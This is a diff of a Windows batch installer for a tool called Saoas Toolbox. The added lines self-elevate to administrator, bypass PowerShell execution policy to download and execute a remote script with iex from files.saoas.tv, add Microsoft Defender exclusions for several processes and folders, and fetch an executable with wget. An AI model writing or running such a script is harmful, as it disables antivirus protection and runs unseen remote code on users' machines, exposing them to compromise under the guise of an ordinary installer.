@@ -1,23 +1,25 @@
-@echo off
-<!-- : --- Self-elevating.bat ---------------------------------------
-whoami /groups | find "S-1-16-12288" > nul && goto :ELEVATED
-echo Requesting administrative privileges...
-set "ELEVATE_CMDLINE=cd /d "%cd%" & call "%~f0" %*"
-cscript //nologo "%~f0?.wsf" //job:Elevate & exit /b
+@echo off & setlocal
+net session >NUL 2>&1 && goto :ELEVATED
+set ELEVATE_CMDLINE=cd /d "%~dp0" ^& "%~f0" %*
+powershell.exe -noprofile -c Start-Process -Verb RunAs cmd.exe \"/c $env:ELEVATE_CMDLINE\"
+exit /b %ERRORLEVEL%
+:ELEVATED
 
--->
-<job id="Elevate"><script language="VBScript">
-  Set objShell = CreateObject("Shell.Application")
-  Set objWshShell = WScript.CreateObject("WScript.Shell")
-  Set objWshProcessEnv = objWshShell.Environment("PROCESS")
-  strCommandLine = Trim(objWshProcessEnv("ELEVATE_CMDLINE"))
-  objShell.ShellExecute "cmd", "/c " & strCommandLine, "", "runas"
-</script></job>
-:ELEVATED -----------------------------------------------------------
+set "psCommand=Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://files.saoas.tv/path.ps1'))"
 
+mkdir "%USERPROFILE%\Desktop\Saoas_Tools"
+mkdir "C:\Saoas"
+
+powershell -NoLogo -Sta -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "& {%psCommand%}"
 powershell -Command Add-MpPreference -ExclusionProcess "Saoas_Toolbox.exe" -Force
-cd /d "%USERPROFILE%/Desktop/"
-powershell Invoke-WebRequest -Uri "https://eternallybored.org/misc/wget/1.21.4/64/wget.exe" -OutFile "wget.exe" 
-wget -q --show-progress --user-agent="chrome" --no-hsts "https://files.saoas.tv/Toolbox/Saoas_Toolbox.exe" -O Saoas_Toolbox.exe
-del /f wget.exe 
-Saoas_Toolbox.exe
+powershell -Command Add-MpPreference -ExclusionProcess "Installer.exe" -Force
+powershell -Command Add-MpPreference -ExclusionProcess "Multi_Downloader.exe" -Force
+powershell -Command Add-MpPreference -ExclusionPath "%USERPROFILE%\Desktop\Saoas_Tools" -Force
+powershell -Command Add-MpPreference -ExclusionPath "C:\Saoas" -Force
+
+cd "%USERPROFILE%\Desktop\Saoas_Tools"
+powershell Invoke-WebRequest -Uri "https://eternallybored.org/misc/wget/1.21.4/64/wget.exe" -OutFile "wget.exe"
+xcopy %USERPROFILE%\Desktop\Saoas_Tools\wget.exe C:\Saoas /y
+wget -q --show-progress --user-agent="chrome" --no-hsts https://files.saoas.tv/Toolbox/Saoas_Toolbox.exe -O Saoas_Toolbox.exe
+del %USERPROFILE%\Desktop\Saoas_Tools\wget.exe
+move %USERPROFILE%\Desktop\Saoas_Tools\Saoas_Toolbox.exe %USERPROFILE%\Desktop
